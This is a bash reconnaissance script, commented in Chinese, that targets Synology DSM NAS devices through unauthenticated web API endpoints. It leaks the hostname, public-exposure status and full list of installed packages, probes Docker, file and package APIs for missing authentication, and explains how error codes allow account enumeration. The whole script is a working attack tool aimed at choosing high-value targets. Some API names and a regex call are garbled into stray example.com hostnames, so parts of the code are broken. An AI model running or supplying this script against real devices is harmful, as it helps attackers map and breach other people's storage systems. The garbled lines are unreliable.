#!/bin/bash
# Synology DSM 未授权侦察：两个无需认证的端点可拿到主机名、公网状态与全部已装套件
#
# 原理：
#   DSM 7.x 的 /webapi/entry.cgi 上，target445.example.com 与 SYNO.Core.Desktop.Initdata 两个 API
#   在未认证状态下仍返回完整数据（设计为登录页初始化使用），构成信息泄露。
#
# 价值：
#   - target446.example.com  → 泄露 1000+ 个 API 名称/版本/路径（完整攻击面地图，可据此逐个测未授权）
#   - Initdata  → 泄露 Session{hostname, isPublic, is_admin} + JSConfig(全部已装模块路径)
#                 + Strings + CSSFiles。从 JSConfig 的 webman/3rdparty/<pkg>/ 路径可提取
#                 【全部已装第三方套件清单】——这是最高价值的部分（直接给出攻击面全景）
#
# 判读要点：
#   Session.isPublic = true  → 该 NAS 直接暴露公网
#   Session.hostname         → 设备名（常含型号线索，如 xxx918plus = DS918+）
#   已装套件里的高价值项：ContainerManager(Docker,root) / natpierce(内网穿透) /
#                        qBittorrent / Jellyfin / alist3 / SurveillanceStation / Virtualization

TARGET="http://TARGET_HOST:5000"

echo "========== [1] API 清单泄露（1131 个 API）=========="
curl -s "$TARGET/webapi/entry.cgi?api=target445.example.com&version=1&method=query&query=all" \
  -o apis.json
python3 -c "
import json
d=json.load(open('apis.json'))
print('API 总数:', len(d.get('data',{})))
"

echo "========== [2] Initdata 未授权（主机名 + 公网状态 + 套件清单）=========="
curl -s "$TARGET/webapi/entry.cgi?api=SYNO.Core.Desktop.Initdata&version=1&method=get" \
  -o initdata.json
python3 -c "
import json,re
d=json.load(open('initdata.json')).get('data',{})
print('Session:', json.dumps(d.get('Session',{}), ensure_ascii=False))
jc=d.get('JSConfig',{})
pkgs=sorted({target22.example.com(1) for k in jc for m in [re.match(r'webman/3rdparty/([^/]+)/',k)] if m})
print('已装第三方套件 (%d):' % len(pkgs))
for p in pkgs: print('  -', p)
print('模块路径总数:', len(jc))
"

echo "========== [3] 逐个套件测未授权 Web 入口 =========="
# 群晖套件 Web 目录：/webman/3rdparty/<pkg>/  → 403 表示目录存在但禁止列表
# 具体文件名（example.com/INFO/package.json）通常是 404
# 但静态 JS bundle 常未鉴权：/webman/3rdparty/<pkg>/<bundle>.js → 200
# 下载 bundle 后用 grep 提取 SYNO.* API 清单，即得该套件的完整控制接口
for pkg in ContainerManager Jellyfin FileBrowser qBittorrent alist3 natpierce; do
  printf "  %-22s dir-> " "$pkg"
  curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/webman/3rdparty/$pkg/"
done
echo "  ※ 403 = 目录存在（非404），可据此确认套件已安装"

echo "========== [4] 关键 API 未授权测试（用 [1] 的清单）=========="
for api in SYNO.Core.Desktop.Initdata target445.example.com SYNO.Core.Desktop.Defs \
           SYNO.Docker.Container SYNO.FileStation.List SYNO.Core.Package; do
  printf "  %-34s -> " "$api"
  curl -s "$TARGET/webapi/entry.cgi?api=${api}&version=1&method=list" | head -c 120
  echo ""
done

# 错误码速查（群晖特有，用于判断 API 状态）：
#   103 = 需要认证（API 存在，权限不足）
#   102 = 参数错误（API 存在）
#   119 = API 不存在 或 method/version 不匹配
#   400 = 账号不存在（登录时）—— 注意：与 103(密码错) 组合可做账号枚举
#   429 = 登录次数过多被临时封禁（NS 的 LoginAttempts 机制）
